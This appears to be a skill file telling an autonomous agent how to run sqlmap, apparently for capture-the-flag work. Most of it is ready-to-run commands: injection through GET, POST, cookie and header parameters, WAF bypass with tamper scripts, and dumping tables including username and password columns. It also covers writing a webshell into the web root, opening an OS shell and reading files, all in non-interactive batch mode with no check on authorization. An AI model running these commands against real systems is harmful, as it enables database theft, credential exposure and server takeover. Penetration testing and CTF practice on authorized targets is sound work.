---
name: sqlmap-advanced
description: "Complete reference for advanced sqlmap usage. Use when a SQL injection is confirmed and automated exploitation with sqlmap is needed. Covers POST/Cookie/Header injection, tamper script selection, precise --technique control, second-order injection, OS shell/file read-write, and database extraction optimization"
zh-signals: "sqlmap 高级用法参考，覆盖多位置注入、tamper 脚本、OS Shell、文件读写与数据库提取优化。信号:sqlmap,SQL注入,tamper,WAF绕过,OS Shell"
when-to-use: "Use when a SQL injection is confirmed and you need automated exploitation via sqlmap across GET/POST/Cookie/Header injection points, tamper selection, OS shell, or file read/write."
metadata:
  tags: "sqlmap,sql injection,tool,tamper,bypass,waf,os-shell,file-read,file-write,database,injection-tool"
  category: "tool"
---

# Complete Reference for Advanced sqlmap Usage

## Timeout Control (mandatory)

sqlmap may run for a long time. **It must be wrapped with timeout**:

```bash
timeout 480 sqlmap [options] --batch 2>&1 | tee /tmp/sqlmap_output.log
# After the timeout, immediately inspect the results obtained so far
tail -80 /tmp/sqlmap_output.log
```

## Further Reading

- Tamper script quick reference → [references/tamper-reference.md](references/tamper-reference.md)
- Detailed commands for advanced usage (OS shell/file read-write/second-order injection/performance tuning) → [references/advanced-usage.md](references/advanced-usage.md)

---

## Phase 1: Basic Detection

### GET parameter injection

```bash
timeout 480 sqlmap -u 'http://target/page.php?id=1' \
    --batch --random-agent --level 2 --risk 2 \
    2>&1 | tee /tmp/sqlmap_output.log
```

### POST parameter injection

```bash
timeout 480 sqlmap -u 'http://target/login.php' \
    --data 'username=admin&password=test&submit=Login' \
    --batch --random-agent --level 2 --risk 2 \
    2>&1 | tee /tmp/sqlmap_output.log
```

**Key point**: `--data` must contain all form fields (especially the submit button), since PHP commonly validates with `isset($_POST['submit'])`.

### Cookie injection

```bash
timeout 480 sqlmap -u 'http://target/page.php' \
    --cookie 'user_id=1; session=abc123' \
    --level 3 \
    --batch --random-agent \
    2>&1 | tee /tmp/sqlmap_output.log
```

### HTTP header injection

```bash
timeout 480 sqlmap -u 'http://target/page.php' \
    --headers 'X-Forwarded-For: 127.0.0.1*' \
    --level 5 \
    --batch --random-agent \
    2>&1 | tee /tmp/sqlmap_output.log
```

The asterisk `*` marks the position of the injection point.

### From a Burp request file

```bash
timeout 480 sqlmap -r /tmp/request.txt \
    --batch --random-agent --level 2 --risk 2 \
    2>&1 | tee /tmp/sqlmap_output.log
```

---

## Phase 2: Precise --technique Control

| Letter | Technique | Applicable scenario |
|------|------|----------|
| B | Boolean-based blind | Boolean differences exist (page content changes) |
| E | Error-based | Errors are reflected back |
| U | UNION query | Data is reflected back |
| S | Stacked queries | Semicolons are supported (MySQL, MSSQL, PostgreSQL) |
| T | Time-based blind | No difference at all (last resort) |
| Q | Inline queries | Subquery injection |

```bash
# Only UNION + Error (fastest)
sqlmap -u 'URL' --technique EU --batch

# Skip the time-consuming time-based blind injection
sqlmap -u 'URL' --technique BEUS --batch
```
→
**Recommendation**: first detect quickly with `--technique EU`, add `B` if it fails, and only try `T` last.

---

## Phase 3: Data Extraction

```bash
# 1. List all databases
sqlmap -u 'URL' --dbs --batch

# 2. List the tables of a given database
sqlmap -u 'URL' -D target_db --tables --batch

# 3. List the columns of a given table
sqlmap -u 'URL' -D target_db -T users --columns --batch

# 4. Extract data
sqlmap -u 'URL' -D target_db -T users --dump --batch

# 5. Only extract specific columns
sqlmap -u 'URL' -D target_db -T users -C username,password --dump --batch

# 6. Limit the number of rows (for large tables)
sqlmap -u 'URL' -D target_db -T users --dump --start 1 --stop 10 --batch

# 7. Search for key tables/columns
sqlmap -u 'URL' --search -T flag --batch
sqlmap -u 'URL' --search -C password --batch
```
→
---

## Practical Quick Reference

| Scenario | Key command parameters |
|------|-------------|
| Quick detection | `--technique EU --level 1 --risk 1` |
| Deep detection | `--level 5 --risk 3` |
| POST form | `--data 'param1=val1&param2=val2'` |
| Cookie injection | `--cookie 'x=1' --level 3` |
| WAF environment | `--tamper=space2comment,between --random-agent` |
| Read a flag file | `--file-read=/flag.txt` |
| Write a webshell | `--file-write=shell.php --file-dest=/var/www/html/` |
| Get a system shell | `--os-shell` |
| Second-order injection | `--second-url URL` |
| Search for the flag | `--search -T flag` or `--search -C flag` |

## Notes

- `--batch` automatically selects default answers (mandatory, the agent cannot interact)
- `--risk 3` may execute UPDATE/DELETE, so use it with care in risky environments
- `timeout 480` runs for at most 8 minutes; on timeout, inspect the results obtained so far
- sqlmap caches results, so use `--flush-session` to clear the cache when re-running against the same target
- If sqlmap cannot detect the injection but you have manually confirmed it → use `--prefix` and `--suffix` to specify the closure manually
